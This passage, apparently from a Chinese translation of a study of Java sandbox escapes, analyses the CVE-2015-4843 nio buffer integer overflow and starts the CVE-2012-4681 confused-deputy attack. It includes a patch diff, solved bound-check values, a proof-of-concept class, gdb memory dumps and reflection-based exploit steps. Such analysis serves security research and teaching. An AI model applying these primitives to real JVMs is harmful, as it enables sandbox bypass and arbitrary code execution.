但是，在易受攻击的版本中，条件就是obj可以转换为cclass。obj可以转换为tclass的条件丢失了。缺少单个条件就足以创建一个安全漏洞，如果利用得当，将导致完全绕过Java沙箱。<br>　　可以预防类型混乱攻击吗？ 在Java中，出于性能原因，每次使用对象o时都不会检查对象o的类型_T_。在每次使用对象时检查类型将防止类型混淆攻击，但也会引起运行时开销。</p><h4 id="3-2-整数溢出"><a href="#3-2-整数溢出" class="headerlink" title="3.2 整数溢出"></a>3.2 整数溢出</h4><h5 id="3-2-1-背景"><a href="#3-2-1-背景" class="headerlink" title="3.2.1 背景"></a>3.2.1 背景</h5><p>　　当算术运算的结果太大而不适合变量的位数时，就会发生整数溢出。在Java中，整数使用32位来表示带符号的数字。正值具有从0x00000000（0）到0x7FFFFFFF（2 ^ 31-1）的值。负值的值为0x80000000（-2 ^ 31）到0xFFFFFFFF（-1）。如果值0x7FFFFFFF（2 ^ 31-1）递增，则结果不表示2 ^ 31但是（-2 ^ 31）。如何使用它来禁用安全管理器？<br>　　在下一节中，我们将分析CVE-2015-4843的整数溢出。整数用作数组中的索引。使用溢出，我们可以读取/写入数组外的值。这些读/写原语用于实现类型混淆攻击。读者已经从上面对CVE-2017-3272的描述中了解到，分析师可以依靠这样的攻击来禁用安全管理器。</p><h5 id="3-2-2-示例：CVE-2015-4843"><a href="#3-2-2-示例：CVE-2015-4843" class="headerlink" title="3.2.2 示例：CVE-2015-4843"></a>3.2.2 示例：CVE-2015-4843</h5><p>　　Redhat的Bugzilla提供了此漏洞的简短描述。它表明在java.nio包中的Buffers类中发现了多个整数溢出，并且该漏洞可用于执行任意代码。<br>　　漏洞补丁实际上修复了文件java / nio / Direct-X-Buffer.java.template，用于生成DirectXBufferY.java形式的类，其中X可以是“Byte”，“Char”，“Double”，“Int”，“长”，“浮动”或“短”，Y可以是“S”，“U”，“RS”或“RU”。“S”表示该数组包含带符号的数字，“U”无符号数，只读模式下的“RS”有符号数和只读模式下的“RU”无符号数。每个生成的类_C_包装一个可以通过类_C_的方法操作的特定类型的数组。例如，DirectIntBufferS.java包装一个32位有符号整数的数组，并将方法get（）和set（）分别定义为将数组中的元素复制到DirectIntBufferS类的内部数组，或者将内部数组中的元素复制到类外的数组。以下是漏洞补丁的摘录：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">14</span>:      <span class="function"><span class="keyword">public</span> $Type$Buffer <span class="title">put</span><span class="params">($type$[] src, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line">15:  #if[rw]</span><br><span class="line"><span class="number">16</span>: -        <span class="keyword">if</span> ((length &lt;&lt; $LG_BYTES_PER_VALUE$)</span><br><span class="line">               &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;</span><br><span class="line"><span class="number">17</span>: +        <span class="keyword">if</span> (((<span class="keyword">long</span>)length &lt;&lt; $LG_BYTES_PER_VALUE$)</span><br><span class="line">               &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;</span><br><span class="line"><span class="number">18</span>:              checkBounds(offset, length, src.length);</span><br><span class="line"><span class="number">19</span>:              <span class="keyword">int</span> pos = position();</span><br><span class="line"><span class="number">20</span>:              <span class="keyword">int</span> lim = limit();</span><br><span class="line"><span class="number">21</span>: @@ -<span class="number">364</span>,<span class="number">12</span> +<span class="number">364</span>,<span class="number">16</span> @@</span><br><span class="line"><span class="number">22</span>:</span><br><span class="line">23:  #if[!byte]</span><br><span class="line"><span class="number">24</span>:              <span class="keyword">if</span> (order() != ByteOrder.nativeOrder())</span><br><span class="line"><span class="number">25</span>: -                Bits.copyFrom$Memtype$Array(src,</span><br><span class="line">                       offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">26</span>: -                  ix(pos), length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">27</span>: +                Bits.copyFrom$Memtype$Array(src,</span><br><span class="line"><span class="number">28</span>: +                  (<span class="keyword">long</span>)offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">29</span>: +                  ix(pos),</span><br><span class="line"><span class="number">30</span>: +                  (<span class="keyword">long</span>)length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">31</span>:              <span class="keyword">else</span></span><br><span class="line">32:  #end[!byte]</span><br><span class="line"><span class="number">33</span>: -                Bits.copyFromArray(src, arrayBaseOffset,</span><br><span class="line">                       offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">34</span>: -                  ix(pos), length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">35</span>: +                Bits.copyFromArray(src, arrayBaseOffset,</span><br><span class="line"><span class="number">36</span>: +                  (<span class="keyword">long</span>)offset &lt;&lt; $LG_BYTES_PER_VALUE$,</span><br><span class="line"><span class="number">37</span>: +                  ix(pos),</span><br><span class="line"><span class="number">38</span>: +                  (<span class="keyword">long</span>)length &lt;&lt; $LG_BYTES_PER_VALUE$);</span><br><span class="line"><span class="number">39</span>:              position(pos + length);</span><br></pre></td></tr></table></figure><p>　　修复（第17,28,36和38行）包括在执行移位操作之前将32位整数转换为64位整数，该移位操作在32位上可能导致整数溢出。从Java 1.8更新65中从java.nio.DirectIntBufferS.java中提取的put（）方法的更正版本如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">354</span>:     <span class="function"><span class="keyword">public</span> IntBuffer <span class="title">put</span><span class="params">(<span class="keyword">int</span>[] src, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="number">355</span>:</span><br><span class="line"><span class="number">356</span>:       <span class="keyword">if</span> (((<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>) &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) &#123;</span><br><span class="line"><span class="number">357</span>:             checkBounds(offset, length, src.length);</span><br><span class="line"><span class="number">358</span>:             <span class="keyword">int</span> pos = position();</span><br><span class="line"><span class="number">359</span>:             <span class="keyword">int</span> lim = limit();</span><br><span class="line"><span class="number">360</span>:             <span class="keyword">assert</span> (pos &lt;= lim);</span><br><span class="line"><span class="number">361</span>:             <span class="keyword">int</span> rem = (pos &lt;= lim ? lim - pos : <span class="number">0</span>);</span><br><span class="line"><span class="number">362</span>:             <span class="keyword">if</span> (length &gt; rem)</span><br><span class="line"><span class="number">363</span>:                 <span class="keyword">throw</span> <span class="keyword">new</span> BufferOverflowException();</span><br><span class="line"><span class="number">364</span>:</span><br><span class="line"><span class="number">365</span>:</span><br><span class="line"><span class="number">366</span>:             <span class="keyword">if</span> (order() != ByteOrder.nativeOrder())</span><br><span class="line"><span class="number">367</span>:                 Bits.copyFromIntArray(src,</span><br><span class="line"><span class="number">368</span>:                                             (<span class="keyword">long</span>)offset &lt;&lt; <span class="number">2</span>,</span><br><span class="line"><span class="number">369</span>:                                             ix(pos),</span><br><span class="line"><span class="number">370</span>:                                             (<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>);</span><br><span class="line"><span class="number">371</span>:             <span class="keyword">else</span></span><br><span class="line"><span class="number">372</span>:</span><br><span class="line"><span class="number">373</span>:                 Bits.copyFromArray(src, arrayBaseOffset,</span><br><span class="line"><span class="number">374</span>:                                    (<span class="keyword">long</span>)offset &lt;&lt; <span class="number">2</span>,</span><br><span class="line"><span class="number">375</span>:                                    ix(pos),</span><br><span class="line"><span class="number">376</span>:                                    (<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>);</span><br><span class="line"><span class="number">377</span>:             position(pos + length);</span><br><span class="line"><span class="number">378</span>:       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="number">379</span>:             <span class="keyword">super</span>.put(src, offset, length);</span><br><span class="line"><span class="number">380</span>:       &#125;</span><br><span class="line"><span class="number">381</span>:       <span class="keyword">return</span> <span class="keyword">this</span>;</span><br><span class="line"><span class="number">382</span>:</span><br><span class="line"><span class="number">383</span>:</span><br><span class="line"><span class="number">384</span>:</span><br><span class="line"><span class="number">385</span>:     &#125;</span><br></pre></td></tr></table></figure><p>　　此方法将src数组中的长度元素从指定的偏移量复制到内部数组。在第367行，调用方法Bits.copyFromIntArray（）。此Java方法将源数组的引用，源数组的偏移量（以字节为单位），以字节为单位的目标数组的索引以及要复制的字节数作为参数。由于最后三个参数表示大小和偏移量（以字节为单位），因此必须将它们乘以4（左侧移位2）。这是针对偏移（线374），pos（线375）和长度（线376）完成的。请注意，对于pos，操作在ix（）方法中完成。<br>　　在易受攻击的版本中，不存在强制转换，这使得代码容易受到整数溢出的影响。<br>　　类似地，将元素从内部数组复制到外部数组的get（）方法也很容易受到攻击。get（）方法与put（）方法非常相似，只是对copyFromIntArray（）的调用被对copyToIntArray（）的调用所取代：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">262</span>:     <span class="function"><span class="keyword">public</span> IntBuffer <span class="title">get</span><span class="params">(<span class="keyword">int</span>[] dst, <span class="keyword">int</span> offset, <span class="keyword">int</span> length)</span> </span>&#123;</span><br><span class="line"><span class="number">263</span>:</span><br><span class="line">[...]</span><br><span class="line"><span class="number">275</span>:                 Bits.copyToIntArray(ix(pos), dst,</span><br><span class="line"><span class="number">276</span>:                                           (<span class="keyword">long</span>)offset &lt;&lt; <span class="number">2</span>,</span><br><span class="line"><span class="number">277</span>:                                           (<span class="keyword">long</span>)length &lt;&lt; <span class="number">2</span>);</span><br><span class="line">[...]</span><br><span class="line"><span class="number">291</span>:     &#125;</span><br></pre></td></tr></table></figure><p>　　由于方法get（）和put（）非常相似，因此下面我们仅描述如何在get（）方法中利用整数溢出。put（）方法的方法是相同的。<br>　　让我们看一下在get（）方法中调用的Bits.copyFromArray（）方法。这种方法实际上是一种原生方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">803</span>:    <span class="function"><span class="keyword">static</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">copyToIntArray</span><span class="params">(<span class="keyword">long</span> srcAddr, Object dst,</span></span></span><br><span class="line"><span class="function"><span class="params"><span class="number">804</span>:                                      <span class="keyword">long</span> dstPos, <span class="keyword">long</span> length)</span></span>;</span><br></pre></td></tr></table></figure><p>　　该方法的C代码如下所示。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">175</span>: JNIEXPORT <span class="keyword">void</span> JNICALL</span><br><span class="line"><span class="number">176</span>: Java_java_nio_Bits_copyToIntArray(JNIEnv *env, jobject <span class="keyword">this</span>,</span><br><span class="line"><span class="number">177</span>:                                   jlong srcAddr, jobject dst,</span><br><span class="line">                                      jlong dstPos, jlong length)</span><br><span class="line"><span class="number">178</span>: &#123;</span><br><span class="line"><span class="number">179</span>:     jbyte *bytes;</span><br><span class="line"><span class="number">180</span>:     <span class="keyword">size_t</span> size;</span><br><span class="line"><span class="number">181</span>:     jint *srcInt, *dstInt, *endInt;</span><br><span class="line"><span class="number">182</span>:     jint tmpInt;</span><br><span class="line"><span class="number">183</span>:</span><br><span class="line"><span class="number">184</span>:     srcInt = (jint *)jlong_to_ptr(srcAddr);</span><br><span class="line"><span class="number">185</span>:</span><br><span class="line"><span class="number">186</span>:     <span class="keyword">while</span> (length &gt; <span class="number">0</span>) &#123;</span><br><span class="line"><span class="number">187</span>:         <span class="comment">/* do not change this code, see WARNING above */</span></span><br><span class="line"><span class="number">188</span>:         <span class="keyword">if</span> (length &gt; MBYTE)</span><br><span class="line"><span class="number">189</span>:             size = MBYTE;</span><br><span class="line"><span class="number">190</span>:         <span class="keyword">else</span></span><br><span class="line"><span class="number">191</span>:             size = (<span class="keyword">size_t</span>)length;</span><br><span class="line"><span class="number">192</span>:</span><br><span class="line"><span class="number">193</span>:         GETCRITICAL(bytes, env, dst);</span><br><span class="line"><span class="number">194</span>:</span><br><span class="line"><span class="number">195</span>:         dstInt = (jint *)(bytes + dstPos);</span><br><span class="line"><span class="number">196</span>:         endInt = srcInt + (size / <span class="keyword">sizeof</span>(jint));</span><br><span class="line"><span class="number">197</span>:         <span class="keyword">while</span> (srcInt &lt; endInt) &#123;</span><br><span class="line"><span class="number">198</span>:             tmpInt = *srcInt++;</span><br><span class="line"><span class="number">199</span>:             *dstInt++ = SWAPINT(tmpInt);</span><br><span class="line"><span class="number">200</span>:         &#125;</span><br><span class="line"><span class="number">201</span>:</span><br><span class="line"><span class="number">202</span>:         RELEASECRITICAL(bytes, env, dst, <span class="number">0</span>);</span><br><span class="line"><span class="number">203</span>:</span><br><span class="line"><span class="number">204</span>:         length -= size;</span><br><span class="line"><span class="number">205</span>:         srcAddr += size;</span><br><span class="line"><span class="number">206</span>:         dstPos += size;</span><br><span class="line"><span class="number">207</span>:     &#125;</span><br><span class="line"><span class="number">208</span>: &#125;</span><br></pre></td></tr></table></figure><p>　　我们注意到没有检查数组索引。如果索引小于零或大于或等于数组大小，则代码也将运行。该代码首先将long转换为32位整数指针（第184行）。然后，代码循环直到长度/大小元素被复制（第186和204行）。对GETCRITICAL（）和RELEASECRITICAL（）（第193和202行）的调用用于同步对dst数组的访问，因此与检查数组的索引无关。<br>　　要执行此本机代码，必须满足get（）Java方法中存在的三个约束：</p><ul><li>约束1：<br><code>356:      if (((long)length &lt;&lt; 2) &gt; Bits.JNI_COPY_FROM_ARRAY_THRESHOLD) {</code></li><li>约束2：<br><code>357:          checkBounds(offset, length, src.length);</code></li><li>约束3：<br><code>362:          if (length &gt; rem)</code></li></ul><p>　　我们没有在第360行提及断言，因为只检查是否在VM中设置了“-ea”（启用断言）选项。这在生产中几乎从未出现过，因为它会导致减速。<br>　　在第一个约束中，JNI_COPY_FROM_ARRAY_THRESHOLD表示通过本机代码从中完成复制的阈值（要复制的元素数）。Oracle凭经验确定从6个元素调用本机代码是值得的。要满足此约束，要复制的元素数必须大于1（6 &gt;&gt; 2）。<br>　　第二个约束出现在checkBounds（）方法中：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">564</span>:    <span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">checkBounds</span><span class="params">(<span class="keyword">int</span> off, <span class="keyword">int</span> len, <span class="keyword">int</span> size)</span> </span>&#123;</span><br><span class="line"><span class="number">566</span>:        <span class="keyword">if</span> ((off | len | (off + len) | (size - (off + len))) &lt; <span class="number">0</span>)</span><br><span class="line"><span class="number">567</span>:            <span class="keyword">throw</span> <span class="keyword">new</span> IndexOutOfBoundsException();</span><br><span class="line"><span class="number">568</span>:    &#125;</span><br></pre></td></tr></table></figure><p>　　第二个约束可以表示如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>:  offset &gt; <span class="number">0</span> AND length &gt; <span class="number">0</span> AND (offset + length) &gt; <span class="number">0</span></span><br><span class="line"><span class="number">2</span>:  AND (dst.length - (offset + length)) &gt; <span class="number">0</span>.</span><br></pre></td></tr></table></figure><p>　　第三个约束检查剩余的元素数是否小于或等于要复制的元素数：<br><code>length &lt; lim - pos</code><br>　　为简化起见，我们假设数组的当前索引为0.然后约束变为：<br><code>length &lt; lim</code><br>　　这是一样的<br><code>length &lt; dst.length</code><br>　　这些约束的解决方案是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dst.length = 1209098507</span><br><span class="line">offset     = 1073741764</span><br><span class="line">length     =          2</span><br></pre></td></tr></table></figure><p>　　使用此解决方案，所有约束都得到满足，并且由于存在整数溢出，我们可以在负指数-240（1073741764 &lt;&lt; 2）处读取8个字节（2 * 4）。我们现在有一个read原语来读取dst数组之前的字节。在get（）方法上使用相同的技术，我们得到一个在dst数组之前写入字节的原语。<br>　　我们可以通过编写一个简单的PoC来检查我们的分析是否正确，并在易受攻击的JVM版本（例如Java 1.8 update 60）上执行它。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"> <span class="number">1</span>:  <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line"> <span class="number">2</span>:</span><br><span class="line"> <span class="number">3</span>:    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"> <span class="number">4</span>:      <span class="keyword">int</span>[] dst = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">1209098507</span>];</span><br><span class="line"> <span class="number">5</span>:</span><br><span class="line"> <span class="number">6</span>:      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dst.length; i++) &#123;</span><br><span class="line"> <span class="number">7</span>:        dst[i] = <span class="number">0xAAAAAAAA</span>;</span><br><span class="line"> <span class="number">8</span>:      &#125;</span><br><span class="line"> <span class="number">9</span>:</span><br><span class="line"><span class="number">10</span>:      <span class="keyword">int</span> bytes = <span class="number">400</span>;</span><br><span class="line"><span class="number">11</span>:      ByteBuffer bb = ByteBuffer.allocateDirect(bytes);</span><br><span class="line"><span class="number">12</span>:      IntBuffer ib = bb.asIntBuffer();</span><br><span class="line"><span class="number">13</span>:</span><br><span class="line"><span class="number">14</span>:      <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; ib.limit(); i++) &#123;</span><br><span class="line"><span class="number">15</span>:        ib.put(i, <span class="number">0xBBBBBBBB</span>);</span><br><span class="line"><span class="number">16</span>:      &#125;</span><br><span class="line"><span class="number">17</span>:</span><br><span class="line"><span class="number">18</span>:      <span class="keyword">int</span> offset = <span class="number">1073741764</span>; <span class="comment">// offset &lt;&lt; 2 = -240</span></span><br><span class="line"><span class="number">19</span>:      <span class="keyword">int</span> length = <span class="number">2</span>;</span><br><span class="line"><span class="number">20</span>:</span><br><span class="line"><span class="number">21</span>:      ib.get(dst, offset, length); <span class="comment">// breakpoint here</span></span><br><span class="line"><span class="number">22</span>:    &#125;</span><br><span class="line"><span class="number">23</span>:</span><br><span class="line"><span class="number">24</span>:  &#125;</span><br></pre></td></tr></table></figure><p>　　此代码创建一个大小为1209098507（第4行）的数组，然后将此数组的所有元素初始化为0xAAAAAAAA（第6-8行）。然后，它创建一个IntBuffer类型的实例ib，并将其内部数组的所有元素（整数）初始化为0xBBBBBBBB（第10-16行）。最后，它调用get（）方法将2个元素从ib的内部数组复制到dst，负偏移为-240（第18-21行）。执行此代码不会导致VM崩溃。而且，我们注意到在调用get之后，没有修改dst数组的元素。这意味着来自ib内部数组的2个元素已被复制到dst之外。让我们通过在第21行设置断点然后在运行JVM的进程上启动gdb来检查这一点。在Java代码中，我们使用sun.misc.Unsafe来计算dst的地址，即0x20000000。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ gdb -p 1234</span><br><span class="line">[...]</span><br><span class="line">(gdb) x/10x 0x200000000</span><br><span class="line">0x200000000:0x000000010x000000000x3f5c025e0x4811610b</span><br><span class="line">0x200000010:0xaaaaaaaa0xaaaaaaaa0xaaaaaaaa0xaaaaaaaa</span><br><span class="line">0x200000020:0xaaaaaaaa0xaaaaaaaa</span><br><span class="line">(gdb) x/10x 0x200000000-240</span><br><span class="line">0x1ffffff10:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x1ffffff20:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x1ffffff30:0x000000000x00000000</span><br></pre></td></tr></table></figure><p>　　使用gdb，我们注意到dst数组的元素已按预期初始化为0xAAAAAAAA。数组不是直接从0xAAAAAAAA开始，而是有一个16字节的头，其中包含数组的大小（0x4811610b = 1209098507）。现在，在数组之前没有任何东西（只有空字节）240个字节。让我们执行get Java方法并使用gdb再次检查内存状态：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">(gdb) c</span><br><span class="line">Continuing.</span><br><span class="line">^C</span><br><span class="line">Thread 1 &quot;java&quot; received signal SIGINT, Interrupt.</span><br><span class="line">0x00007fb208ac86cd in pthread_join (threadid=140402604672768,</span><br><span class="line">  thread_return=0x7ffec40d4860) at pthread_join.c:90</span><br><span class="line">90in pthread_join.c</span><br><span class="line">(gdb) x/10x 0x200000000-240</span><br><span class="line">0x1ffffff10:0x000000000x000000000x000000000x00000000</span><br><span class="line">0x1ffffff20:0xbbbbbbbb0xbbbbbbbb0x000000000x00000000</span><br><span class="line">0x1ffffff30:0x000000000x00000000</span><br></pre></td></tr></table></figure><p>　　从ib的内部数组到dst的两个元素的副本“工作”：它们在dst的第一个元素之前被复制了240个字节。由于某种原因，程序没有崩溃。查看进程的内存映射表明在0x20000000之前有一个内存区域，即rwx：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ pmap 1234</span><br><span class="line">[...]</span><br><span class="line">00000001fc2c0000  62720K rwx--   [ anon ]</span><br><span class="line">0000000200000000 5062656K rwx--   [ anon ]</span><br><span class="line">0000000335000000 11714560K rwx--   [ anon ]</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure><p>　　如下所述，在Java中，类型混淆是沙箱总旁路的同义词。漏洞CVE-2017-3272的想法是使用读写原语来执行类型混淆。我们的目标是在内存中具有以下结构：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">  B[] |0|1|............|k|......|l|</span><br><span class="line">  A[] |0|1|2|....|i|................|m|</span><br><span class="line">int[] |0|..................|j|....|n|</span><br></pre></td></tr></table></figure><p>　　类型为_B_的元素数组，位于<em>IntBuffer</em>对象的内部数组之前的_A_类型的元素数组之前。第一步是使用read原语复制内部整数数组（索引j）内_A_（索引为i）的元素的地址。第二步包括将引用从内部数组（在索引j处）复制到类型为_B_的元素（在索引k处）。完成这两个步骤后，JVM会认为索引k处的元素是_B_类型，但它实际上是_A_类型的元素。<br>　　处理堆的代码很复杂，可以从VM更改为VM（Hotspot，JRockit等），也可以从版本更改为版本。我们已经获得了一个稳定的情况，其中所有三个阵列彼此相邻，用于50个不同版本的JVM，具有以下数组大小：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">l = 429496729</span><br><span class="line">m = l</span><br><span class="line">n = 858993458</span><br></pre></td></tr></table></figure><h5 id="3-2-3-讨论"><a href="#3-2-3-讨论" class="headerlink" title="3.2.3 讨论"></a>3.2.3 讨论</h5><p>　　我们已经测试了Java 1.6,1.7和1.8的所有公开可用版本的漏洞。总共51个版本都是易受攻击的：18个版本的1.6（1.6_23到1.6_45），28个版本的1.7（1.7_0到1.7_80）和5个版本的1.8（1.8_05到1.8_60）。<br>　　我们已经讨论过上面的补丁：补丁代码现在首先在执行移位操作之前将32位整数转换为长整数。这有效地防止了整数溢出。</p><h3 id="4-Java级漏洞"><a href="#4-Java级漏洞" class="headerlink" title="4 Java级漏洞"></a>4 Java级漏洞</h3><h4 id="4-1-混淆代理"><a href="#4-1-混淆代理" class="headerlink" title="4.1 混淆代理"></a>4.1 混淆代理</h4><h5 id="4-1-1-背景"><a href="#4-1-1-背景" class="headerlink" title="4.1.1 背景"></a>4.1.1 背景</h5><p>　　混淆代理攻击是Java平台上非常常见的攻击类型。示例攻击是CVE-2012-5088，CVE-2012-5076，CVE-2013-2460以及CVE-2012-4681的攻击，我们将在下面详细介绍。基本思想是利用代码旨在访问私有方法或系统类的字段，以便例如停用安全管理器。但是，漏洞代码不是直接访问所需的类成员，而是代表受信任的系统类执行访问。为此目的滥用系统类的典型方法是利用反射或MethodHandles的不安全使用，即，可信系统类对目标字段执行可由分析员确定的反向读取访问。</p><h5 id="4-1-2-示例：CVE-2012-4681"><a href="#4-1-2-示例：CVE-2012-4681" class="headerlink" title="4.1.2 示例：CVE-2012-4681"></a>4.1.2 示例：CVE-2012-4681</h5><p>　　我们将看看CVE-2012-4681，因为这经常被其他作者称为混淆代理攻击的一个例子。<br>　　作为第一步，我们检索对<em>sun.awt.SunToolkit</em>的访问，这是一个受限制的类，不受信任的代码应该是不可访问的。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Expression expr0 = <span class="keyword">new</span> Expression(Class.class, <span class="string">"forName"</span>,</span><br><span class="line"><span class="number">2</span>: <span class="keyword">new</span> Object[] &#123;<span class="string">"sun.awt.SunToolkit"</span>&#125;);</span><br><span class="line"><span class="number">3</span>: Class sunToolkit = (Class)expr.execute().getValue();</span><br></pre></td></tr></table></figure><p>　　这已经利用了漏洞。即使我们将Class.forName（）指定为Expression的目标方法，实际上也不会调用此方法。相反，<em>Expression</em>专门为这种情况实现自定义逻辑，它在没有正确检查访问权限的情况下加载类。因此，<em>Expression</em>在这里作为我们混淆代理，为我们加载一个我们不允许加载的类。<br>　　下一步，我们使用SunToolkit.getField（）来访问私有字段Statement.acc。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>: Expression expr1 = <span class="keyword">new</span> Expression(sunToolkit, <span class="string">"getField"</span>,</span><br><span class="line"><span class="number">2</span>: <span class="keyword">new</span> Object[] &#123;Statement.class, <span class="string">"acc"</span>&#125;);</span><br><span class="line"><span class="number">3</span>: Field acc = expr1.execute().getValue();</span><br></pre></td></tr></table></figure><p>　　getField（）是另一个混淆代理，我代表他们获得对系统类的私有字段的反射访问。以下代码段显示getField（）使用doPrivileged（）来获取请求的字段，并将其设置为可访问，以便稍后可以修改其值。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 